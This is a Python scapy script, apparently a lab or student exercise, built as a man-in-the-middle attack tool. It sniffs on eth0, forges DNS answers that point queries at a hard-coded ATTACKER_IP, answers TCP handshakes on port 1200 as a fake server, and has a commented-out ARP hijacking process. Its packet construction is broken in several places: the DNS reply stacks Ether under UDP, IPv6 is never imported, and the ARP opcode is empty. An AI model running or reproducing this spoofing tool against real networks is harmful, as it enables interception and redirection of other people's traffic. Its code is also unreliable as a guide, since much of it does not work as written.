#!/usr/bin/env python3
from multiprocessing import Process

#import coloredlogs
from scapy.all import *
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP, TCP, IP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.dns import DNSRR
import random
import socket

ATTACKER_IP = "172.21.255.245"
INTERFACE = "eth0"

class TCPServerState:
    LISTEN = 0,
    SYN_RECIEVED = 1,
    ESTABLISHED = 2,
    # graceful close
    FIN_WAIT = 3

http_server_state = TCPServerState.LISTEN

def arp_main(src_hw_addr: str, target_hw_addr: str, gw_hw_addr: str, target_ip_addr: str, gw_ip_address: str) -> None:
    while True:
        p = Ether(dst=target_hw_addr, src=src_hw_addr) / ARP(op="")
        sendp(p)
        time.sleep(1.0)


def on_dns_packet(p: Packet) -> None:
    logging.info(f"forwarding DNS request")
    # print(p[DNS])
    #if p[DNS].qr == 1:

    if p[DNS].qr == 0:
        #print("packet received: ")
        #p.show()
        print("sending packet: ")
        response = IPv6(src=p[IPv6].dst, dst = p[IPv6].src) / UDP(sport=p[UDP].dport, dport=p[UDP].sport) / Ether(src=p[Ether].dst, dst=p[Ether].src) / DNS(qr=1, aa=1,id=p[DNS].id, an=DNSRR(rdata=(ATTACKER_IP)))
        #response.show()
        sendp(response, iface=INTERFACE)

def on_http_packet(p: Packet) -> None:
    global http_server_state
    assert IP in p
    assert TCP in p
    assert p[TCP].dport == 1200
    #print("received packet:")
    #print(p.show())
    if http_server_state == TCPServerState.LISTEN: # Listening 
        if p[TCP].flags == 'S':
            # send back SYN-ACK
            # ACK sequence + 1, pick random ISN
            print("packet received:")
            print(p.show())
            #r = #(Ether(src=p[Ether].dst, dst=p[Ether].src) 
            #r = IP(dst=p[IP].src, src=p[IP].dst)/TCP(flags='SA', dport=p[TCP].sport, sport=1200, ack=p[TCP].seq + 1, seq=random.randrange(1000,2000))
            seq_num = int(p[TCP].seq)
            r = (Ether(dst=p[Ether].src, src=p[Ether].dst)/(IP(dst=p[IP].src, src=p[IP].dst)/TCP(dport=p[TCP].sport, sport=p[TCP].dport, flags='SA', seq=random.randrange(0,(2**32) - 1), ack=seq_num+1)))
            print("sending packet:")
            print(r.show())
            #s = socket.create_connection((p[IP].src, p[TCP].sport))
            #s.sendall(r)
            #s.close()
            sendp(r, INTERFACE)
            #http_server_state = TCPServerState.SYN_RECIEVED
            pass
        elif p[TCP].flags == 'R':
            print("received a RST packet")
        elif p[TCP].flags == 'A':
            print("received an ACK packet!!!")

    elif http_server_state == TCPServerState.SYN_RECIEVED:
        #print(p.show())
        # recv ACK
        if p[TCP].flags == 'A':
            print("received an ACK")
            print(p.show())
            http_server_state = TCPServerState.ESTABLISHED
        else:
            print("failed")
    pass

def on_packet(p: Packet) -> None:
    #if IP in p:
     #   print("getting IPv4 packet")
    #elif IPv6 in p:
     #   print("getting IPv6 packet")
    if TCP in p and p[TCP].dport == 1200:
        print("getting http packet")
        on_http_packet(p)
    if UDP in p and DNS in p:
        print("getting dns packet")
        on_dns_packet(p)


def main() -> None:
    #src_hw_addr = sys.argv[1]
    #target_hw_addr = sys.argv[2]
    #gw_hw_addr = sys.argv[3]
    #target_ip_addr = sys.argv[4]
    #gw_ip_addr = sys.argv[5]

    #coloredlogs.install(level="INFO")

    #logging.info(f"starting ARP hijacker on {INTERFACE}")
    #p = Process(target=arp_main, args=(src_hw_addr, target_hw_addr, gw_hw_addr, target_ip_addr, gw_ip_addr))
    #p.start()

    logging.info(f"starting sniffer on {INTERFACE}")
    #sniff(prn=lambda p: on_packet(p), quiet-True, filter=PACKET_FILTER, iface=INTERFACE, store=False)
    sniff(store=False, iface=INTERFACE, prn=on_packet)

    #p.join()


if __name__ == "__main__":
    main()
